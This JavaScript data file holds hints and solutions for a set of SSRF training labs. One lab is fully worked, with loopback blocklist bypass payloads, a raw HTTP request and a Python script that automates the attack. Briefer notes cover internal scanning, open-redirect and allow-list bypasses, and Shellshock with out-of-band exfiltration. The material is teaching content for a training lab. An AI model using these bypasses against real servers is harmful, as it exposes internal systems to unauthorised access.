export default {
  'ssrf-lab-basic-ssrf-against-localhost': {
    note: 'The stock-check endpoint fetches a URL; point it at `http://localhost/admin` and delete the user.'
  },
  'ssrf-lab-basic-ssrf-against-backend-system': {
    note: 'The backend lives on an internal IP; scan the /24 with the stock-check URL to find port 8080, then reach `/admin`.'
  },
  'ssrf-lab-out-of-band-detection': {
    note: 'The response does not change, but the server fetches the `Referer` URL; a Collaborator hit proves the request.'
  },
  'ssrf-lab-ssrf-with-blacklist-filter': {
    note: '`localhost` and `127.0.0.1` are blocked; use an alternate encoding such as `127.1` or decimal `2130706433`.',
    work: {
      hints: [
        'The stock-check endpoint accepts a full URL. `http://127.0.0.1/` and `http://localhost/` are rejected.',
        'The blocklist compares strings. The IP parser accepts shorter and numeric forms of the same address.',
        'Use `http://127.1/admin` (or `http://2130706433/admin`) and delete Carlos.'
      ],
      approach:
        'A string blocklist in front of a URL fetcher. The fetcher resolves the alternate notation to the same loopback address, so the request reaches the admin interface the filter was trying to protect.',
      request: `POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION

stockApi=http://127.1/admin`,
      tokens: [
        ['http://', 'Scheme. The fetcher supports HTTP and will follow the URL server-side.'],
        ['127.1', 'A historical shorthand: the second field is 24 bits, producing 127.0.0.1. The blocklist does not recognise it.'],
        ['/admin', 'The internal management path, reachable from loopback but not from the public interface.'],
        ['(response)', 'The admin HTML is returned in the stock-check response, giving a read primitive.']
      ],
      script: `import sys, requests

host = sys.argv[1]
base = f"https://{host}"
s = requests.Session()
s.post(f"{base}/login", data={"username": "wiener", "password": "peter"}, timeout=20)
for target in ["http://127.1/admin", "http://2130706433/admin", "http://[::1]/admin"]:
    r = s.post(f"{base}/product/stock", data={"stockApi": target}, timeout=20)
    print(target, r.status_code, "admin" in r.text.lower())
    if r.status_code == 200 and "admin" in r.text.lower():
        break`
    }
  },
  'ssrf-lab-ssrf-filter-bypass-via-open-redirection': {
    note: 'Only the shop host is allowed, but its redirect endpoint can be pointed at the internal admin URL.'
  },
  'ssrf-lab-shellshock-exploitation': {
    note: 'An internal CGI endpoint is vulnerable to Shellshock; put the payload in `User-Agent` and exfiltrate via Collaborator.'
  },
  'ssrf-lab-ssrf-with-whitelist-filter': {
    note: 'The allow-list checks a substring; use userinfo (`https://expected@attacker`), a fragment, or a subdomain to reach the internal host.'
  }
}
